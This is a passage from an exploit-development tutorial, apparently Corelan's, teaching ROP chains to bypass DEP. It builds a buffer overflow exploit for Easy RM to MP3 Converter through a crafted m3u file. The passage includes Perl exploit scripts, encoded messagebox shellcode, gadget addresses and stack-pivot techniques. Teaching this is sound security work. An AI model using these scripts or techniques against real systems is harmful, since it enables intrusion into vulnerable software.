and execute the instructions at that\nlocation.\nWhen DEP is enabled, we cannot do that.  We can call the p\/p\/r just\nfine, but when it lands back, it would start executing code from the\nstack. And we cannot execute code on the stack, remember ?  We have to\nbuild a ROP chain, and have that chain bypass\/disable the execution\nprevention system first.  This chain will be placed on the stack (as\npart of your exploit payload)\nSo in the case of a SEH based exploit, we have to find a way to return\nto our payload (on the stack in our case) instead of calling a pop pop\nret sequence.\nThe easiest way to do so, is by performing a so-called \"stack pivot\"\noperation. Instead of using a pop pop ret, we\u2019ll just try to get back\nto a location on the stack where our buffer resides.  You can do this\nby issuing one of the following instructions :\n* add esp, offset + ret\n* mov esp, register + ret\n* xchg register,esp + ret\n* call register (if a register points to data you control)\n* mov reg,[ebp+0c] + call reg (or other references to seh record)\n* push reg + pop esp + ret (if you control \u2018reg\u2019)\n* mov reg, dword ptr fs:[0] + \u2026 + ret  (set esp indirectly, via SEH\nrecord)\nAgain, how this can initiate our ROP chain, will be discussed below.\nBefore we begin\nIn [130]Dino Dai Zovi\u2018s awesome paper on ROP, he has visualized the ROP\nexploit process components (page 39) very well. When building a ROP\nbased exploit, you will need to\n* Pivot to the stack\n* Use your gadgets to set up stack\/registers (ROP payload)\n* Throw in your regular shellcode\n* Get the shellcode to execute\n[131]Dino Zai Dovi's visualization of ROP exploit building process\n(image used with permission of Dino Zai Dovi)\nWe will walk through all of these stages in the next chapters.\nDirect RET \u2013 The ROP version \u2013 VirtualProtect()\nTime to ROP \u2018n ROLL\nLet\u2019s build our first ROP exploit.\nWe will be using Windows XP SP3 Professional, English, with DEP in\nOptOut mode.\n[132]image\nIn this example, I will try to build a ROP based exploit for [133]Easy\nRM to MP3 Converter, the vulnerable application which was used earlier\nin [134]tutorial 1.\nNote : the offsets and addresses may be different on your system.\nDon\u2019t just blindly copy everything from this tutorial, but try it\nyourself and adjust addresses where necessary.\nEasy RM to MP3 Converter is vulnerable to a buffer overflow when\nopening a m3u file that contains an overly long string.  Using a cyclic\npattern, we discover that EIP gets overwritten after 26094 bytes.\nAgain, this is the offset on my system. If the offset is different,\nthen change the script accordingly. The offset is based on the location\nwhere the m3u file is placed on your system, as the application will\nprepend your buffer with the full path to the file. You can calculate\nthe offset with 20000 A\u2019s + 7000 char Metasploit pattern).\nAnyways, the skeleton exploit script (perl) will look something like\nthis :\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"A\" x $buffersize;\nmy $eip=\"BBBB\";\nmy $rest = \"C\" x 1000;\nmy $payload = $junk.$eip.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nIf our offset is correct, EIP should get overwritten with BBBB\n(42424242) \u2026\n[135]offset is correct, EIP is overwritten with 42424242\n\u2026 and ESP points at an address that contains our C\u2019s.  So far so good,\nthis is a typical direct RET overwrite exploit.\nIf it wasn\u2019t for DEP, we would place our shellcode at ESP (instead of\nthe C\u2019s) and overwrite EIP with a pointer to jmp esp. But we cannot do\nthat because the shellcode won\u2019t get executed due to DEP.\nSo we will create a ROP chain that will use the VirtualProtect()\nfunction (kernel32.dll) to change the access protection level of the\nmemory page where the shellcode is located, so it can get executed.\nIn order to make that work, we will need to pass a number of parameters\nto this function. These parameters need to sit at the top of the stack\nat the time the function gets called.\nThere are a few ways to do this.  We can put the required values in\nregisters and then issue a pushad (which will put everything on the\nstack in one time). A second technique would be to put some of the\nparameters (the static ones\/the ones without null bytes) on the stack\nalready, and use some ROP gadgets to calculate the other parameters and\nwrite them onto the stack (using some kind of sniper technique).\nWe cannot use null bytes in the m3u file, because Easy RM to MP3\nConverter would treat the data in the file as a string, and the string\nwould get terminated at the first null byte.  We also need to keep in\nmind that we\u2019ll most likely end up with some character set limitations\n(we\u2019ll simply create encoded shellcode to overcome this issue)\nEnough small talk, let\u2019s get started.\nHow to build the chain (chaining basics)\nIn order to bypass DEP, we will need to build a chain of existing\ninstructions.  Instructions which can be found in all modules (as long\nas they\u2019re executable, have a static address and don\u2019t contain null\nbytes then it should be fine).\nBasically, since you will need to put data on the stack (parameters to\na function that will bypass DEP), you will be looking for instructions\nthat will allow you to modify registers, push and pop data to and from\nthe stack and so on.\nEach of those instructions will \u2013 somehow \u2013 need to \"jump\" to the next\ninstruction (or set of instructions) you want to execute.  The easiest\nway to do this, is by making sure the instruction is followed by a RET\ninstruction. The RET instruction will pick up the next address from the\nstack and jump to it. (After all, we start our chain from the stack, so\nthe RET will return to the caller (the stack  in our case) and take the\nnext address). So basically, in our chain, we will be picking up\naddresses from the stack and jump to them. The instructions at those\naddresses can pick up data from the stack (so these bytes have to be\nplaced in the right place of course).  The combination of those two\nwill form our rop chain.\nEach \"instruction+RET\" is called a \"ROP gadget\".\nThis means that, in between pointers (pointers to instructions), you\ncan put data that can get picked up by one of the instructions. At the\nsame time, you will need to evaluate what the instructions will do and\nhow that will impact the spacing you need to introduce between 2\npointers on the stack.  If an instruction performs ADD ESP,8, then this\nwill shift the stack pointer, and that will have an impact on where the\nnext pointer must be placed. This is required so the RET at the end of\na gadget would return to the pointer of the next instruction.\nI guess it is becoming clear that your ROP routine will most likely\nconsume a good amount of bytes on the stack.  So the available buffer\nspace for your rop routine will be important.\nIf all of this sounds complicated, then don\u2019t worry. I\u2019ll use a little\nexample to make things clear :\nLet\u2019s say, as part of our ROP routine, we need to take a value from the\nstack, put it in EAX, and increase it with 0x80. In other words :\n* we need to find a pointer to POP EAX + RET and put it on the stack\n(gadget 1)\n* the value that must be placed into EAX must be placed right below\nthe pointer\n* we need to find another pointer (to ADD EAX,80 + RET) and place it\nright below the value that is popped into the stack  (gadget 2)\n* we need to jump to the first gadget (pointer to POP EAX+RET) to\nkick off the chain\nWe will talk about finding rop pointers in a few minutes. For now, I\u2019ll\njust give you the pointers :\n10026D56  : POP EAX + RET : gadget 1\n1002DC24 : ADD EAX,80 + POP EBX + RET : gadget 2\n(the second pointer will also execute POP EBX.  This will not break our\nchain, but it will have an impact on ESP and the padding that needs to\nbe used for the next rop gadget, so we have to insert some \"padding\" to\ncompensate for that)\nSo, if we want to execute those 2 instructions after each other, and\nend up with our desired value in eax, then the stack would be set up\nlike this :\nStack address Stack value\nESP points here -> 0010F730 10026D56 (pointer to POP EAX + RET)\n0010F734 50505050 (this will be popped into EAX)\n0010F738 1002DC24 (pointer to ADD EAX,80  + POP EBX + RET)\n0010F73C DEADBEEF (this will be popped into EBX, padding)\nSo, first, we will need to make sure 0x10026D56 gets executed. We are\nat the beginning of our sploit, so we just have to make EIP point to a\nRET instruction.  Find a pointer that points to RET in one of the\nloaded modules and put that address into EIP. We will use 0x100102DC.\nWhen EIP is overwritten with a pointer to RET, it will obviously jump\nto that RET instruction. The RET instruction will return to the stack,\ntaking the value at ESP (0x10026D56) and jump to it.  That will execute\nPOP EAX and will put 50505050 into EAX.  The RET after POP EAX (at\n0x10026D57) will jump to the address that is at ESP at this time. This\nwill be 0x1002DC24 (because 50505050 was popped into eax first).\n0x1002DC24 is the pointer to ADD EAX,80 + POP EBX + RET, so that next\ngadget will add 0x80 to 50505050.\nOur example sploit will look like this :\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"A\" x $buffersize;\nmy $eip=pack('V',0x100102DC);  #pointer to RET\nmy $junk2 = \"AAAA\"; #compensate, to make sure ESP points at first rop gadget\nmy $rop = pack('V',0x10026D56);       #POP EAX + RET (gadget 1)\n$rop = $rop . pack('V',0x50505050);   #this will be popped into EAX\n$rop = $rop . pack('V',0x1002DC24);   #ADD EAX,80 + POP EBX + RET (gadget 2)\n$rop = $rop . pack('V',0xDEADBEEF);   #this will be popped into EBX\nmy $rest = \"C\" x 1000;\nmy $payload = $junk.$eip.$junk2.$rop.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nAttach the debugger to the application and set a breakpoint on\n0x100102DC.  Run the application and load the m3u file. The breakpoint\nshould get hit :\n[136]breakpoint hit, EIP points to RET, stack contains the 2 gadgets\nWhen the breakpoint gets hit, EIP points at our RETN instruction. You\ncan see in the small window below the CPU view that this RET\ninstruction will return to 0x10026D56 (which sits at the top of the\nstack, the location where ESP point at)\nIf we now step through, one instruction at a time (F7), this is what\nhappens :\n* RETN : EIP jumps to 0x10026D56, ESP moves to 0010F734\n* POP EAX : This will take 50505050 from the stack and place it into\nEAX. ESP moves to 0010F738\n* RETN : This will put 1002DC24 into EIP and moves ESP to 0010F73C\n* ADD EAX,80 : This will add 0x80 to 50505050 (EAX)\n* POP EBX : This will put DEADBEEF into EBX and will increase ESP\nwith 4 bytes again (to 0010F740)\n* RETN : This will take the next pointer from the stack and jump to\nit (43434343 in this example)\nRight before the last RETN is executed, we should see this :\n[137]gadgets executed\nAs you can see, we have been able to execute instructions and craft\nvalues in registers, without executing a single opcode directly from\nthe stack. We have chained existing instructions to each other, which\nis the essence of ROP.\nMake sure you understand the concept of chaining before continuing.\nFinding ROP gadgets\nA few moments ago, I have explained the basics of ROP chains. In\nessence you will need to find instructions\/instruction sequences that\nare followed by a RET instruction (RETN, RETN 4, RETN 8 and so on),\nwhich will allow you to \"jump\" to the next sequence\/gadget.\nThere are 2 approaches to finding gadgets that will help you building\nthe ROP chain :\n* You can specifically search for instructions and see if they are\nfollowed by a RET.  The instructions between the one you are\nlooking for, and the RET instruction (which will end the gadget)\nshould not break the gadget.\n* You can look for all RET instructions and then walk back, see if\nthe previous instructions include the instruction you are looking\nfor.\nIn both cases, you can use the debugger to search for instructions,\nsearch for RET, etc. Manually searching these instructions, however,\nmay be very time consuming.\nFurthermore, if you use the \"list all ret\u2019s and look back\" approach\n(which will produce more results at once and give you more accurate\nresults), you may have to do some opcode splitting to find additional\ngadgets (that will end with the same ret).\nThis may sound a bit vague, so I\u2019ll give you an example.\nLet\u2019s say you found a RET at 0x0040127F  (opcode 0xC3).  In the\ndebugger CPU view, the instruction before the ret is ADD AL,0x58\n(opcode 0x80 0xc0 0x58). So you have found a gadget which will add 0x58\nto AL and then returns to the caller.\n[138]image\nThese 2 instructions can produce another gadget, by splitting the\nopcode of the ADD instruction. The last byte of the ADD instruction is\n0x58. And that\u2019s the opcode for POP EAX.\nThat means that there is a second rop gadget, starting at 0x0040127E :\n[139]image\nYou may not have discovered this one if you have been looking for RETs\nand then looking at the previous instructions in the debugger view.\nIn order to make your life a little bit easier, I have written a\nfunction in pvefindaddr, which will\n* look for all rets (RETN, RETN 4, RETN 8 and so on),\n* look back (up to 8 instructions),\n* and will do \"opcode splitting\" to find new gadgets, ending with the\nsame RET\nSo all you have to do, to build your set of rop gadgets, is running\n!pvefindaddr rop, and it will give you a huge number of rop gadgets to\nplay with.  And if your pointers (rop gadgets) should be null byte\nfree, then simply run \"!pvefindaddr rop nonull\".\nThe function will write all ROP gadgets to a file \"rop.txt\" into the\nImmunity Debugger program folder.  Note that this operation is very CPU\nintensive, and it can take up to a day to generate all gadgets\n(depending on the number of loaded modules).  My advise is to find the\nmodules you want to use (!pvefindaddr noaslr) and then run !pvefindaddr\nrop instead of blindly running it on all modules.\nYou can create the rop gadgets from a specific module by specifying the\nmodule name  (for example :  \"!pvefindaddr rop MSRMfilter03.dll\")\n[140]using !pvefindaddr to build rop gadgets\nNote : \"!pvefindaddr rop\" will automatically ignore addresses from\nASLR modules or modules that might get rebased. This will help\nensuring that the result (rop.txt) only contains pointers that\nshould result in a more or less reliable exploit. If you insist on\nincluding pointers from those modules, you\u2019ll have to manually run\n!pvefindaddr rop for each of those modules.\n\"CALL register\" gadgets\nWhat if you are looking for a particular instruction, but can\u2019t seem to\nfind a gadget that ends with a ret ?  What if you have performed a\nsearch for the instruction in your favorite loaded module, and\ndiscovered that the only one you could find, has a \"CALL register\"\ninstruction before the RET ?\nNot all is lost in this case.\nFirst of all, you should find a way to put a meaningful pointer in that\nregister. Just have a pointer sit on the stack and find yourself a\ngadget that will put this value into the register.  That will make sure\nthat the CALL reg instruction will actually work.\nThis pointer could be just a RET, allowing you to do as if the CALL\ninstruction never existed.  Or you can simply use a pointer to another\nrop gadget to continue your rop chain.\npvefindaddr rop will also list gadgets that have a call reg\ninstruction before the RET\nGotcha. But how\/where exactly do I start ?\nThe first things you have to do, before writing a single line of code,\nis setting your strategy, by asking yourself the following questions :\n* What technique (Windows API) will I use to bypass DEP and what are\nthe consequences in terms of stack setup \/ parameters that need to\nbe created on the stack. What is the current DEP policy and what\nare your options in terms of bypassing it ?\n* What are the rop gadgets I can use ?  (This will be your toolbox\nand will allow you to craft your stack.)\n* How to start the chain ? How to pivot to your controlled buffer ?\n(In a direct RET exploit, you most likely control ESP, so you can\nsimply overwrite EIP with a pointer to RETN to kick start the\nchain)\n* How will you craft the stack ?\nAnswers :\n* Technique : In this example, I will use VirtualProtect() to modify\nthe protection parameters of the memory page where the shellcode is\nlocated. You can obviously use one of the other\nDEP-policy-compatible functions, but I will use VirtualProtect() in\nthis example. This function requires the following parameters to\nsit at the top of the stack when the function gets called :\n+ return address. After the VirtualProtect() function has\nfinished, this is where the function will return to.  (=\npointer to the location where the shellcode is placed. Dynamic\naddress, will need to be generated at runtime (rop))\n+ lpAddress : pointer to the location where the shellcode is\nplaced. This is a dynamic address that will need to be\ngenerated at runtime (rop)\n+ Size : speaks for itself, will need to be generated at runtime\n(unless your exploit buffer can deal with null bytes, but that\nis not the case with Easy RM to MP3)\n+ flNewProtect : new protection flag. This value must be set to\n0x20 to mark the page executable. This value contains null\nbytes, so this value may have to be generated at runtime as\nwell\n+ lpflOldProtect : pointer, will receive the old protection flag\nvalue. This can be a static address, but must be writeable.\nI\u2019ll take an address from one of the modules from Easy RM to\nMP3 Converter (0x10035005)\n* ROP gadgets : !pvefindaddr rop\n* Start the chain : pivot to the stack. In this example, it\u2019s a\ndirect RET overwrite, so we just need a pointer to RET. We already\nhave a working pointer (0x100102DC)\n* Crafting the stack can be done in various ways. You can put values\ninto registers and them push them onto the stack. You can have some\nvalues sit on the stack and write the dynamic ones using a sniper\ntechnique. Building this logic, this puzzle, this Rubik\u2019s cube, is\nprobably the hardest part of the entire ROP building process.\nOur encoded shellcode (\"spawn a messagebox\") will be around 620 bytes\nand will be initially stored somewhere on the stack. (We\u2019ll have to\nencode our shellcode because Easy RM to MP3 has some character\nlimitations)\nOur buffer \/ stack will look something like this :\n* junk\n* eip\n* junk\n* rop chain to generate\/write the parameters\n* rop chain to call the VirtualProtect function\n* more rop \/ some padding \/ nops\n* shellcode\n* junk\nand at the time the VirtualProtect function is called, the stack is\nmodified (by the rop chain) to look like this :\njunk\neip\njunk\nrop\nESP points here -> parameters\nmore rop\npadding \/ nops\nshellcode\njunk\nTest before you start\nBefore actually building the rop chain, I will verify that the\nVirtualProtect() call will lead to the desired result. The easiest way\nto do this, is by manually crafting the stack \/ function parameters\ninside the debugger :\n* make EIP point at the VirtualProtect() function call. On XP SP3,\nthis function can be found at 0x7C801AD4\n* manually put the desired arguments for VirtualProtect() onto the\nstack\n* put the shellcode on the stack\n* launch the function.\nIf that works, I\u2019m sure that the VirtualProtect() call will work, and\nthat the shellcode works as well.\nIn order to facilitate this simple test, we\u2019ll use the following sploit\nscript :\n#ROP based exploit for Easy RM to MP3 Converter\n#written by corelanc0d3r - http:\/\/www.corelan.be\nmy $file= \"rop.m3u\";\nmy $buffersize = 26094;\nmy $junk = \"Z\" x $buffersize;\nmy $eip=pack('V',0x7C801AD4);  #pointer to VirtualProtect\nmy $junk2 = \"AAAA\"; #compensate\nmy $params=pack('V',0x01010101);   #return address\n$params = $params.\"XXXX\";          #lpAddress\n$params = $params.\"YYYY\";          #Size - Shellcode length\n$params = $params.\"ZZZZ\";          #flNewProtect\n$params = $params.pack('V',0x10035005);   #writeable address\n# .\/msfpayload windows\/messagebox\n#  TITLE=CORELAN TEXT=\"rop test by corelanc0d3r\" R\n# | .\/msfencode -e x86\/alpha_mixed -t perl\nmy $shellcode =\n\"\\x89\\xe0\\xda\\xcf\\xd9\\x70\\xf4\\x5a\\x4a\\x4a\\x4a\\x4a\\x4a\\x4a\" .\n\"\\x4a\\x4a\\x4a\\x4a\\x4a\\x43\\x43\\x43\\x43\\x43\\x43\\x37\\x52\\x59\" .\n\"\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41\\x41\\x51\\x32\\x41\" .\n\"\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42\\x58\\x50\\x38\\x41\\x42\" .\n\"\\x75\\x4a\\x49\\x48\\x59\\x48\\x6b\\x4f\\x6b\\x48\\x59\\x43\\x44\\x51\" .\n\"\\x34\\x4c\\x34\\x50\\x31\\x48\\x52\\x4f\\x42\\x42\\x5a\\x46\\x51\\x49\" .\n\"\\x59\\x45\\x34\\x4e\\x6b\\x51\\x61\\x44\\x70\\x4e\\x6b\\x43\\x46\\x46\" .\n\"\\x6c\\x4c\\x4b\\x42\\x56\\x45\\x4c\\x4c\\x4b\\x42\\x66\\x43\\x38\\x4c\" .\n\"\\x4b\\x51\\x6e\\x45\\x70\\x4e\\x6b\\x50\\x36\\x44\\x78\\x42\\x6f\\x45\" .\n\"\\x48\\x44\\x35\\x4c\\x33\\x50\\x59\\x43\\x31\\x4a\\x71\\x4b\\x4f\\x48\" .\n\"\\x61\\x43\\x50\\x4c\\x4b\\x50\\x6c\\x51\\x34\\x46\\x44\\x4e\\x6b\\x47\" .\n\"\\x35\\x45\\x6c\\x4c\\x4b\\x42\\x74\\x43\\x35\\x42\\x58\\x46\\x61\\x48\" .\n\"\\x6a\\x4e\\x6b\\x51\\x5a\\x45\\x48\\x4e\\x6b\\x42\\x7a\\x47\\x50\\x47\" .\n\"\\x71\\x48\\x6b\\x4a\\x43\\x45\\x67\\x42\\x69\\x4e\\x6b\\x47\\x44\\x4e\" .\n\"\\x6b\\x46\\x61\\x48\\x6e\\x46\\x51\\x49\\x6f\\x45\\x61\\x49\\x50\\x49\" .\n\"\\x6c\\x4e\\x4c\\x4d\\x54\\x49\\x50\\x50\\x74\\x45\\x5a\\x4b\\x71\\x48\" .\n\"\\x4f\\x44\\x4d\\x47\\x71\\x4b\\x77\\x48\\x69\\x48\\x71\\x49\\x6f\\x49\" .\n\"\\x6f\\x4b\\x4f\\x45\\x6b\\x43\\x4c\\x47\\x54\\x44\\x68\\x51\\x65\\x49\" .\n\"\\x4e\\x4e\\x6b\\x50\\x5a\\x45\\x74\\x46\\x61\\x48\\x6b\\x50\\x66\\x4e\" .\n\"\\x6b\\x46\\x6c\\x50\\x4b\\x4c\\x4b\\x51\\x4a\\x45\\x4c\\x45\\x51\\x4a\" .\n\"\\x4b\\x4e\\x6b\\x43\\x34\\x4c\\x4b\\x43\\x31\\x4a\\x48\\x4d\\x59\\x42\" .\n\"\\x64\\x51\\x34\\x47\\x6c\\x45\\x31\\x4f\\x33\\x4f\\x42\\x47\\x78\\x44\" .\n\"\\x69\\x49\\x44\\x4f\\x79\\x4a\\x45\\x4e\\x69\\x4a\\x62\\x43\\x58\\x4e\" .\n\"\\x6e\\x42\\x6e\\x44\\x4e\\x48\\x6c\\x43\\x62\\x4a\\x48\\x4d\\x4c\\x4b\" .\n\"\\x4f\\x4b\\x4f\\x49\\x6f\\x4d\\x59\\x42\\x65\\x43\\x34\\x4f\\x4b\\x51\" .\n\"\\x6e\\x48\\x58\\x48\\x62\\x43\\x43\\x4e\\x67\\x47\\x6c\\x45\\x74\\x43\" .\n\"\\x62\\x49\\x78\\x4e\\x6b\\x4b\\x4f\\x4b\\x4f\\x49\\x6f\\x4f\\x79\\x50\" .\n\"\\x45\\x45\\x58\\x42\\x48\\x50\\x6c\\x42\\x4c\\x51\\x30\\x4b\\x4f\\x51\" .\n\"\\x78\\x50\\x33\\x44\\x72\\x44\\x6e\\x51\\x74\\x50\\x68\\x42\\x55\\x50\" .\n\"\\x73\\x42\\x45\\x42\\x52\\x4f\\x78\\x43\\x6c\\x47\\x54\\x44\\x4a\\x4c\" .\n\"\\x49\\x4d\\x36\\x50\\x56\\x4b\\x4f\\x43\\x65\\x47\\x74\\x4c\\x49\\x48\" .\n\"\\x42\\x42\\x70\\x4f\\x4b\\x49\\x38\\x4c\\x62\\x50\\x4d\\x4d\\x6c\\x4e\" .\n\"\\x67\\x45\\x4c\\x44\\x64\\x51\\x42\\x49\\x78\\x51\\x4e\\x49\\x6f\\x4b\" .\n\"\\x4f\\x49\\x6f\\x42\\x48\\x42\\x6c\\x43\\x71\\x42\\x6e\\x50\\x58\\x50\" .\n\"\\x68\\x47\\x33\\x42\\x6f\\x50\\x52\\x43\\x75\\x45\\x61\\x4b\\x6b\\x4e\" .\n\"\\x68\\x51\\x4c\\x47\\x54\\x47\\x77\\x4d\\x59\\x4b\\x53\\x50\\x68\\x51\" .\n\"\\x48\\x47\\x50\\x51\\x30\\x51\\x30\\x42\\x48\\x50\\x30\\x51\\x74\\x50\" .\n\"\\x33\\x50\\x72\\x45\\x38\\x42\\x4c\\x45\\x31\\x50\\x6e\\x51\\x73\\x43\" .\n\"\\x58\\x50\\x63\\x50\\x6f\\x43\\x42\\x50\\x65\\x42\\x48\\x47\\x50\\x43\" .\n\"\\x52\\x43\\x49\\x51\\x30\\x51\\x78\\x43\\x44\\x42\\x45\\x51\\x63\\x50\" .\n\"\\x74\\x45\\x38\\x44\\x32\\x50\\x6f\\x42\\x50\\x51\\x30\\x46\\x51\\x48\" .\n\"\\x49\\x4c\\x48\\x42\\x6c\\x47\\x54\\x44\\x58\\x4d\\x59\\x4b\\x51\\x46\" .\n\"\\x51\\x48\\x52\\x51\\x42\\x46\\x33\\x50\\x51\\x43\\x62\\x49\\x6f\\x4e\" .\n\"\\x30\\x44\\x71\\x49\\x50\\x50\\x50\\x4b\\x4f\\x50\\x55\\x45\\x58\\x45\" .\n\"\\x5a\\x41\\x41\";\nmy $nops = \"\\x90\" x 200;\nmy $rest = \"C\" x 300;\nmy $payload = $junk.$eip.$junk2.$params.$nops.$shellcode.$rest;\nprint \"Payload size : \".length($payload).\"n\";\nprint \"Shellcode size : \".length($shellcode).\"n\";\nopen($FILE,\">$file\");\nprint $FILE $payload;\nclose($FILE);\nprint \"m3u File $file Created successfullyn\";\nWith this script, we will overwrite EIP with a pointer to\nVirtualProtect() (0x7C801AD4), and we will put the 5 required\nparameters on top of the stack, followed by some nops, and messagebox\nshellcode.\nThe lpAddress, Size and flNewProtect parameters are set to \"XXXX\",\n\"YYYY\" and \"ZZZZ\". We will manually change them in a few moments.\nCreate the m3u file, attach Immunity Debugger to the application and\nset the breakpoint to 0x7C801AD4. Run the application, open the m3u\nfile and verify that the breakpoint was hit :\n[141]image\nNow look at the top of the stack. We should see our 5 parameters :\n[142]image\nScroll down until you see the begin of the shellcode :\n[143]image\nTake note of the base address of the shellcode (0010F80C in my case)\nand scroll down to verify that the entire shellcode was placed onto the\nstack.\nThe idea is now to manually edit the parameters on the stack so we can\ntest if the VirtualProtect call would work.\nEditing a value on the stack is as simple as selecting the value,\npressing CTRL+E, and entering a new value (just remember that it\u2019s\nlittle endian !).\nFirst, edit the value at 0010F730 (return address) and set it to the\naddress of the shellcode (0010F80C).\n[144]image\nThen edit the value at 0010F734 (Address, now containing 58585858), and\nset it to 0010F80C (again, the address where your shellcode resides)\n[145]image\nNext, edit the value at 0010F738 (Size, now containing 59595959) and\nset it to the size of the shellcode. I\u2019ll just take 700 bytes (to be on\nthe safe side), which corresponds with 0x2BC\n[146]image\nIt\u2019s ok to be a little bit \"off\", just make sure that your shellcode\nwill be contained within the Address+Size range.  You will see that\nit might be difficult to craft an exact value when using rop, so\nit\u2019s important to understand that you don\u2019t have to be exact. If you\nsurround your code with nops and if you make sure you end up\ncovering all of the shellcode, then it should be fine.\nFinally, edit the value at 0010F73C (NewProtect) and set it to 0x40 :\n[147]image\nAfter making the modifications, the stack looks like this :\n[148]image\nPress F7 once and watch how the jump to VirtualProtect() is made.\n[149]image\nAs you can see, the function itself is pretty short, and, apart from a\nfew stack interactions, only contains a call to VirtualProtectEx. This\nfunction will change the access protection level.\nContinue to step through the instructions (F7) until you reach the RETN\n10 instruction (at 0x7C801AED).\nAt that point, the stack contains this :\n[150]image\nThe ret will make the jump to our shellcode and execute it (if all went\nwell).\nPress F9 :\n[151]image\nThis means that the VirtualProtect() technique was successful.\nNow it\u2019s time to stop playing & make it generic ( = create the dynamic\nvalues at runtime).\nEverybody stay cool, this is a roppery\nIf you were hoping for some generic instructions to build a ROP chain,\nthen I have to disappoint you. There is no such thing.  What follows is\nthe result of some creativity, trial & error, some asm facts, and the\noutput of !pvefindaddr rop.\nThe only thing that might come close to a possible \"more or less\ngeneric \"rop structure (this is just one that has been working well for\nme) might look something like this :\n[152]rop structure\nAs you can see, we basically limit the number of instructions (rop\ngadgets) at the beginning of the chain. We just save the stack pointer\nand then make a jump (over the Virtualprotect function\/parameters),\nwhich will make it easier to overwrite the parameter placeholders later\non. (Don\u2019t worry \u2013 you\u2019ll understand what I mean in a few moments)\nThe function pointer\/parameter placeholders are obviously not rop\ngadgets, but just static data that is placed on the stack, as part of\nyour buffer. The only thing you will need to do is change\/overwrite the\nplaceholders with the dynamically created values, using a rop chain\nthat is located after the placeholders.\nFirst of all, we will have to change the address that was used to\noverwrite EIP in our test script. Instead of making a call directly to\nVirtualProtect(), we now have to return to the stack (so it can pick up\na pointer to get the chain started). That means that we need to\noverwrite EIP with a pointer to RETN.  We\u2019ll use the one that was found\nearlier : 0x100102DC\nNext, we need to think about the possible options to craft our values\nand put them in the right place on the stack.\n* Pointer to shellcode : one of the easiest ways to do this, is by\ntaking the address of ESP, putting it in a register, and increasing\nit until it points at the shellcode. There may be other ways, we\nwill really have to look what is at our disposal based on the\noutput in rop.txt\n* Size variable : You can either set a register to a start value and\nincrease it until it contains 0x40.  Or you can look for an ADD or\nSUB instruction on a register which will, when it gets executed,\nproduce 0x40. Of course, you will have to put (POP from the stack)\nthe start value into that register first.\n* Putting the dynamically generated data back to the stack can be\ndone in various ways as well. You can either put the values, in the\nright order, in the registers and do a pushad to put them on the\nstack.  Alternatively you can write to specific locations on the\nstack using \"MOV DWORD PTR DS:[registerA+offset],registerB\"\ninstructions. RegisterB must contain the desired value first, of\ncourse.\nSo it\u2019s clear that you will have to look at rop.txt, your toolbox, and\nsee what approach will work.\nYou will obviously need to find instructions that will not mess up\nthe flow or change other registers\/values\u2026 and if they do, perhaps\nyou can take advantage of that.  The process of building a rop chain\nis pretty much like solving a Rubik\u2019s [tm] cube.  When you execute\none instruction, it might have an impact on other registers\/stack\nlocations\/\u2026.  The goal is to try to take advantage of them (or to\navoid them altogether if they would really break the chain)\nAnyways, start by creating your rop.txt file.  If you insist on using\npointers from application dll\u2019s, then you can create multiple rop\nfiles, each targeting a specific module.  But as long as you are hard\ncoding the function pointer to a Windows OS API, using the address from\nthe OS dll itse,f, then it might not make any sense to avoid OS dll\u2019s.\nAlternatively, it might be worth while verifying if one of the\napplication dll\u2019s contains the same function call. That would help\nmaking the exploit portable and generic. (see \"ASLR\" later on)\nIn this example, I will be using VirtualProtect(). The application\nspecific modules that can be used are either the executable itself (not\nsubject to ASLR) and msrmfilter03.dll (not subject to ASLR and will not\nget rebased either).  So, load both files into IDA free and see if one\nof these modules contains a call to VirtualProtect(). If that is the\ncase, we might as well try to use a pointer from the application\nitself.\nResult : no calls found, so we\u2019ll have to use the address from\nkernel32.dll\nAll good \u2013 let\u2019s get started \u2013 for real\nStage 1 : saving stack pointer and jumping over the parameters\n2 of our VirtualProtect() function parameters need to point at our\nshellcode.  (Return address and lpAddress).  Since the shellcode is\nplaced on the stack, the easiest way to do this, is by taking the\ncurrent stack pointer and storing it in a register.  This has 3\nadvantages :\n* you can easily add\/sub the value in this register to make it point\nat your shellcode. ADD, SUB, INC, DEC instructions are pretty\ncommon\n* the initial value points is pretty close to the stack address where\nthe pointer to VirtualProtect() is located.  We might be able to\ntake advantage of that at the end of the rop chain, when we need to\njump back and call VirtualProtect()\n* this value is also close to the stack location of the parameter\nplaceholders. That might make it easy to use a \"mov dword ptr\nds:[register+offset],register\" instruction to overwrite the\nparameter placeholder.\nSaving the stack pointer can be done in many ways : MOV REG,ESP \/ PUSH\nESP + POP REG, etc\nYou will notice that MOV REG,ESP is not a good choice, because it\u2019s\nvery likely that, inside the same gadget, the REG will be popped again,\nthus overwriting the stack pointer in REG again.\nAfter doing a quick search in rop.txt, I found this :\n0x5AD79277 : # PUSH ESP # MOV EAX,EDX # POP EDI # RETN   [Module : uxtheme.dll]\nThe stack pointer is pushed to the stack, and picked up in EDI.  That\u2019s\nnice, but, as you will learn, EDI is not a really popular register in\nterms of instructions that would do ADD\/SUB\/\u2026 on that register. So it\nmight be a good idea to save the pointer into EAX as well. Furthermore,\nwe might need to have this pointer in 2 registers because we\u2019ll need to\nchange one so it would point to the shellcode, and we might need to use\nthe other one to point it to the location on the stack where the\nfunction parameter placeholder is located.\nSo, another quick search in rop.txt gives us this :\n0x77C1E842 :  {POP}  # PUSH EDI # POP EAX # POP EBP # RETN  [Module : msvcrt.dll\n]\nThis will save the same stack pointer into EAX as well.  Pay attention\nto the POP EBP instruction. We will need to add some padding to\ncompensate for this instruction.\nOk, that\u2019s all we need for now.  I really like to avoid writing too\nmuch gadgets before the function pointer \/ parameters, because that\nmight make it harder to overwrite the parameter placeholders.  So what\nis left now, is jumping over the function block.\nThe easiest way to do this, is by adding some bytes to ESP, and\nreturning\u2026 :\n0x1001653D :  